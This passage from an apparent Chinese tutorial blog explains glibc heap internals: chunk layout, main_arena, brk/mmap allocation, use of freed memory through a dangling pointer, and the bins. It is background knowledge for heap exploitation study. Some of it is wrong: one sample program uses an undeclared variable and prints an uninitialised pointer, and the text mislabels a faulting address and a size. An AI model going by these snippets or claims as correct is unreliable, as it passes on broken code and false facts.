从上图可以看出堆是由<strong>低地址向高地址生长的</strong>，这一点必须要清楚。虽然程序可以请求一块连续内存，并自由地使用，但是还应清楚：<strong>堆在内存空间中不一定连续</strong>。</p><p>      下面我们运行一下上述的代码，在main函数打个断点，当运行完<code>call malloc</code>后，该函数会返回给寄存器<code>eax</code>一个值，这个值就是动态申请的返回的指针<code>ptr</code>。</p><p><img src="/images/136-4.png" alt></p><center><font size="2">图2</font></center><blockquote><p>从上图可以看出返回的地址为<code>0x5555555592a0</code>，对于chunk来说这只是user_content的开始，不是chunk的地址，这块后面会详细讲解。</p></blockquote><p><img src="/images/136-2.png" alt></p><center><font size="2">图3</font></center><blockquote><p>从上图中可以看出，在执行malloc之后在程序的虚拟内存空间中映射了一个heap区域（有关虚拟地址的映射我会在后期在单独写一篇），也就是说这个时候堆已经分配成功了，那么我们计算一下映射的堆的大小是多少：<code>0x000055555557a000- 0x0000555555559000=0x21000（132KB）</code>，下面我们进行验证，看一下堆中的情况，如下图：</p></blockquote><p><img src="/images/136-3.png" alt></p><center><font size="2">图4</font></center><blockquote><p>如上图所示，执行完malloc后会有三个堆块，在这里先不说这些堆块的意义，只是计算一下它们的合计大小：<code>0x290+0x40+0x20d63=0x21000</code>，验证成功。在这里留几个问题：</p><ol><li><font color="green">【图一】返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</font></li><li><font color="green">【图一】我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</font></li><li><font color="green">【图二】我们只申请了大小为50个字节的堆空间，为什么给我们分配了<code>132KB</code>大小的堆空间？</font></li><li><font color="green">【图三】我们只申请了一个堆块，为什么堆空间中有三个堆块？</font></li></ol></blockquote><p>      下面我们还不会讲malloc背后的原理，让我们带着这些问题走进堆的学习。</p><h3 id="font-color-navy0x01-chunk讲解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-chunk讲解font"></a> <font color="navy"><code>0x01 Chunk讲解</code></font></h3><p>      首先来看chunk的结构，下面给出chunk的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从官方给出的源码中可以看出，chunk有两种结构，分别是<code>malloced chunk</code>和<code>freed chunk</code>，下面根据源码中的数据结构给出两种chunk的结构示意图，在这里给出的是64位下的，对齐字节为16字节。</p></blockquote><p><img src="/images/136-5.png" alt></p><center><font size="2">图5</font></center><blockquote><p>注释：</p><ul><li><code>prev_size</code>：当标志位p=0时，表示前面的chunk处于free状态，这时这里表示的是前一个chunk的大小；当p=1时，表示前面的chunk处于malloc状态，这时这里的数据可以被前面的chunk复用，下面会有例子说明；</li><li><code>size</code>：当前整个chunk的大小</li><li><code>user content</code>：用户申请的大小</li><li><code>A/M/P</code>：标志位<ul><li>A：A=0 为主分区（main_arena）分配，A=1 为非主分区分配</li><li>M：M=0为使用heap区域，M=1表示使用mmap映射区域</li><li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效，P=1表示pre_chunk在使用中，prev_size被pre_chunk复用</li></ul></li><li><code>fd</code>：前一个堆块的地址（不是返回给用户的地址哦），只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>bk</code>：后一个堆块的地址，只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>fd_nextsize</code>： <strong>Only used for large blocks: pointer to next larger size</strong></li><li><code>bk_nextsize</code>：<strong>Only used for large blocks: pointer to prev larger size</strong></li></ul></blockquote><p>      有了上述的知识储备，那么我们就可以来回答第一个问题：<code>返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</code>我们从图5中可以看到，我们<strong>申请的堆空间只是user_content部分</strong>，<strong>而chunk真正的起始地址应该是指向prev_size的部分</strong>，所以chunk的起始地址应该为<code>返回给用户的地址-0x10=chunk的起始地址</code>，那么我们也就解决了第1个问题：<code>0x5555555592a0-0x10 = 0x555555559290</code></p><h3 id="font-color-navy0x02-main_arenafont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-main_arenafont"></a> <font color="navy"><code>0x02 main_arena</code></font></h3><p>      这里就是要回答第二个、第三个和第四个问题。在上述例子中，我们申请了50bytes大小的堆，操作系统却给我们申请了132KB大小的堆空间，这是为什么呢？首先在这里先向大家引入一个概念：<code>main_arena</code>，如下图：</p><p><img src="/images/136-6.png" alt></p><center><font size="2">图6</font></center><blockquote><p><code>main_arena</code>是由主线程分配的堆空间，<code>main_arena</code>中含有多个chunk，也就是返回给我们申请的堆的地址。因为132KB远远大于50B，所以如果主线程后续再申请堆空间的话，就会先从这132KB的剩余部分进行申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。<sup>[1]</sup></p></blockquote><p>      通过上述的介绍，我想<strong>第三个问题已经被解决了</strong>，下面开始第二个问题：<code>我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</code>通过上图我们可以看出，我们申请的50B大小的chunk，只是user_content部分的大小，所以真正的chunk大小应该是<code>0x8(prev_size)+0x8(size)+50=66Bytes</code>，但是从第2张图片中我们看到系统却只给我们64KB，这是为什么呢？还记得上一节中讲的chunk的标志位吗？当p=1时，则表示pre_chunk在使用中，prev_size被pre_chunk复用，对！这里就是这个意思，也就是说我们申请的堆块有2字节被放在了next chunk的prev_size字段中，下面我们可以写个程序验证一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      在执行了mecpy函数后，我们看一下堆中的存储情况，因为我们输入的字符串长度为50，正好是我们申请的大小，所以这里没有堆溢出，那么现在预测一下chunk的user_content，应该都是&quot;a&quot;，next_chunk的prev_size部分应该是&quot;b&quot;，如下图：</p><p><img src="/images/136-7.png" alt></p><center><font size="2">图7</font></center><blockquote><p>有关第二个问题，可以这样回答：因为我们申请的是50B大小的chunk，但是实际chunk的大小应该是：<code>用户申请的大小+16+nextchunk可以被复用的部分-prevchunk被复用的部分</code></p></blockquote><p>      下面只有第四个问题没有解决了：<code>我们只申请了一个堆块，为什么堆空间中有三个堆块？</code>在这里需要在main_arena区域中引入两个新的概念：<code>top chunk</code>和（<code>另外一个还没搞明白</code>），如下图：</p><p><img src="/images/136-8.jpg" alt></p><center><font size="2">图8</font></center><blockquote><p>从上图中可以看到，除了用户申请的chunk外的空间，处于高地址部分的为top chunk，该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。<sup>[1]</sup></p></blockquote><h3 id="font-color-navy0x03-malloc机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-malloc机制font"></a> <font color="navy"><code>0x03 malloc机制</code></font></h3><p>      在linux平台malloc本质上都是通过系统调用<strong>brk</strong>或者<strong>mmap</strong>实现的，如下图：</p><p><img src="/images/136-9.png" alt></p><center><font size="2">图9</font></center><blockquote><p>从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。</p><p>1、brk是将数据段(.data)的最高地址指针_edata往高地址推；</p><p>2、mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。</p><pre><code> 这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。</code></pre><p>在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。<sup>[3]</sup></p></blockquote><p><code>brk()函数</code></p><blockquote><p><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L252" target="_blank" rel="noopener">brk</a>通过增加program break的位置（brk）从内核申请（非零值初始化的）内存。一开始，堆段(heap segment)的起始位置（start_brk）和结束位置(brk)指向同一个位置：</p><ul><li>当ASLR（Address Space Layout Randomization）关闭时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（end_data）。</li><li>当ASLR打开时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（<code>end_data</code>）再加上一个随机的brk偏移。</li></ul><p>上面的进程虚拟内存布局图展示了，start_brk是堆段的开始位置，brk(program break)则是堆段的结束位置。</p><p>malloc小于<code>M_MMAP_THRESHOLD</code>（默认为128KB）的内存<sup>[５]</sup>，使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：<sup>[4]</sup></p></blockquote><p><img src="/images/136-10.jpg" alt></p><center><font size="2">图10</font></center><blockquote><ol><li><p>进程启动的时候，其（虚拟）内存空间的初始布局如图10-(1)所示。</p><p>其中，mmap内存映射文件是在堆和栈的中间（<a href="http://xn--libc-2-9v9ii49d.2.93.so" target="_blank" rel="noopener">例如libc-2.2.93.so</a>，其它数据文件等），为了简单起见，省略了内存映射文件。_edata指针（glibc里面定义）指向数据段的最高地址。</p></li><li><p>进程调用**A=malloc(30KB)**以后，内存空间如图10-(2)：</p><ul><li><p>malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。</p></li><li><p>你可能会问：只要把_edata+30K就完成内存分配了？</p></li><li><p>事实是这样的，_edata+30K只是完成虚拟地址的分配，<strong>A这块内存现在还是没有物理页与之对应的</strong>，等到进程第一次读写A这块内存的时候，<strong>发生缺页中断，内核才分配A这块内存对应的物理页</strong>。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</p></li></ul></li><li><p>进程调用B=malloc(40K)以后，内存空间如图10-(3)。</p></li></ol></blockquote><p><code>mmap()函数</code></p><blockquote><p>malloc使用<a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="noopener">mmap</a>创建一个私有匿名的映射段。这个映射段的主要目的是申请一块（零值初始化的）新内存，这块内存处于栈和堆之间，并且<strong>这块内存只能被调用的这个进程独占使用</strong>。<sup>[4]</sup>当主线程malloc的大小大于128KB时以及子线程在申请动态内存时，会用到mmap来申请。</p></blockquote><p><img src="/images/136-11.png" alt></p><center><font size="2">图11</font></center><blockquote><ol><li><p>进程调用C=malloc(200K)以后，内存空间如图11-(4)：</p><p>默认情况下，malloc函数分配内存，如果请<strong>求内存大于128K</strong>（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是<strong>利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。</strong></p><p>这样子做主要是因为：<strong>brk分配的内存需要等到高地址内存释放以后才能释放</strong>（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。<br>当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。</p></li><li><p>进程调用D=malloc(100K)以后，内存空间如图11-(5)；</p></li><li><p>进程调用<code>free(C)</code>以后，C对应的虚拟内存和物理内存一起释放如图11-(6)。</p></li></ol></blockquote><p><code>总结</code>：</p><ol><li>我们申请动态内存空间，实质上是由brk或mmap函数来完成的</li><li>申请的动态内存空间实质上是Arena区域的一个chunk，并且我们申请的大小只不过是user_content并不是整个chunk的大小</li><li>chunk在使用时和空闲时分别有着对应的状态，两者有着差别</li><li>堆的生长空间是从低地址到高地址</li></ol><h3 id="font-color-navy0x04-free机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-free机制font"></a> <font color="navy"><code>0x04 Free机制</code></font></h3><p>      还记得文章开头的程序代码吗？我问了一个问题：<font color="red"><code>程序代码中有什么问题吗？</code> </font>下面就来看看上述代码有没有问题。给我们申请的内存赋值50个字符串后，我们再调用free函数，这个时候看一下chunk中的情况，如下图：</p><p><img src="/images/136-12.png" alt></p><center><font size="2">图12</font></center><blockquote><p>从图中看到，在free之后，chunk的结构发生了变化，但是除了<code>fd</code>和<code>bk</code>部分的数据改变以外，其他的数据并没有发生改变，那么在free之后我们是否能将剩下的数据打印出来呢？下面写个程序验证一下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">[*] After  free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br></pre></td></tr></table></figure><blockquote><p>可以看出虽然我们free了chunk，但是我们仍然可以通过指针来访问chunk上的数据，所以说在free之后，我们一定要将指针置0，如下程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><blockquote><p>可以看出在打印free后的chunk情况时发生了段错误，因为puts中的参数为0x10c，是内核地址，所以不能访问。</p></blockquote><p><font size="5"><strong>敲黑板！敲黑板！敲黑板！</strong></font>这里再提出一个问题：<code>free后的chunk去哪了？我们再次申请同样大小的chunk，会返回什么指针？</code>这里先解决第二个问题：<code>在free chunk后，再次申请同样大小的chunk，这时返回用户的指针是什么呢？</code>下面还是用程序进行验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr0,*ptr1;</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr0,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"   </span></span><br><span class="line"><span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk0:%p\n"</span>,ptr0);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] ptr0 = NULL\n"</span>);</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk1:%p\n"</span>,ptr1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] The address of chunk0:0x5652b84e52a0</span><br><span class="line">[+] ptr0 = NULL</span><br><span class="line">[*] The address of chunk1:0x5652b84e52a0</span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果可以看出我<strong>们第一次和第二次返回的指针相同，也就说明我们两次申请的动态内存空间是同一个空间</strong>，这是什么原因呢？下面就一步一步来解决这个问题：在堆释放后，为了充分利用chunk，系统并不会立即收回chunk，而是把chunk放到一个地方，如果程序中再次申请同样大小的chunk时，会直接将该chunk的地址返回，这里说的地方就是存放空闲chunk的链表结构<code>bins</code>，这里涉及的结构体就是malloc_state，如下是它的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从上面的源代码可以看出，bins由两个数组构成分别是：FastbinsY[NFASTBINS]和bins[NBINS * 2 - 2]，通过查阅相关代码，可以知道FastbinsY[]中有一个容器：<code>fastbin</code>，bins[]由三个容器：<code>unsorted bins</code>、<code>small bins</code>和<code>large bins</code>。系统会根据空闲chunk的大小和处于的状态，会将空闲的chunk放在上述4个不同的bins中。注：在libc.2.26以上的动态链接库中又增加了一个<code>Tcache</code>机制，在这里就不展开了。</p></blockquote><h4 id="font-color-blue1fastbinsyfont"><a class="markdownIt-Anchor" href="#font-color-blue1fastbinsyfont"></a> <font color="blue"><code>1.FastbinsY[]</code></font></h4><p><code>fastbins</code></p><p>      该数组主要包含的是<code>fastbins</code>数据结构，它主要用于提高<strong>小内存</strong>的分配效率，默认情况下对于size_sz为4B的平台，小于64B的chunk分配请求；但对于size_ze为8B的平台，小于128B的chunk分配请求，首先会查找fastbins中是否具有所需大小的chunk存在，如果存在则直接返回；</p><p>      我们也可以<strong>把fastbins看作为small bins的一个cache</strong>，默认情况下，对于相同大小的链表上，fastbins只缓存small bins的前7个大小的chunk（Tcache也只缓存fastbins或smallbins的前7个大小的chunk），该结构的特点还有：</p><ol><li>没有bk指针，也就是说它是一个单链表结构</li><li>prev_inuse标志位一定为1，也就是说fastbins chunk不会和其他chunk进行合并</li><li>采用LIFO （先进后出）策略</li></ol><p>      fastbins的结构如下图：</p><p><img src="/images/136-13.png" alt></p><center><font size="2">图13</font></center><h4 id="font-color-blue2binsfont"><a class="markdownIt-Anchor" href="#font-color-blue2binsfont"></a> <font color="blue"><code>2.Bins[]</code></font></h4><p>      该数组中存放的是<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code>，这三个bin均是双链表结构，均可以发生合并，并且一共有126个bins，分别被划分为：</p><ul><li><code>bin[1]</code>：Unsorted bin</li><li><code>bin[2-63]</code>：small bins</li><li><code>bin[64-126]</code>：large bins</li></ul><p>      下图是三个bins的结构图：</p><p><img src="/images/136-15.png" alt></p><center><font size="2">图14</font></center><p><code>Unsorted bins</code></p><p>      Unsorted bins可以看成small bins和large bins的cache，其中只有一个Unsorted bin，并且是以双链表管理空闲的chunk，并且在unsorted bin中的chunk不进行排序，所有的chunk在回收时都要先放到unsorted chunk中（对于高版本的libc，会先放到Tcache中）。那么在分配时，也就是再次申请动态内存时，<strong>如果unsorted bin中没有合适的chunk，就会把unsorted bin中的所有chunk分别加入到所属的bin中</strong>，然后再在bin中分配合适的chunk，bins数组中的元素<code>bin[1]</code>用于存储unsorted bin的chunk链表头。</p><p><code>Small bins</code></p><p>      <code>ptmalloc</code>使用small bins管理空闲小的chunk，每个small bin中的chunk的大小与bin的index有关，计算公式如下：<code>chunk_size = 2*size_sz*index</code>，small bins和faste bins的大小有一部分是重叠的，其实当发生Consolidate时，fastbin中的堆块在一定情况下可以进入到small bin中。</p><p><code>Large bins</code></p><p>      在size_sz为4B的平台上，大小等于512B的空闲chunk或者在size_sz为8B的平台上，大小等于1024B的空闲chunks有large bins管理。Large bins一共包含63个bin，每个bin中的chunk大小不是一个固定公差的等差数列，，每组bin的数量依次为32，16，8，4，2，1，公差依次为64B、512B、4096B、32768B、262144B。</p><p><code>三个bin的大小对比</code></p><p>      如下图：</p><p><img src="/images/136-14.png" alt></p><center><font size="2">图15</font></center><p>      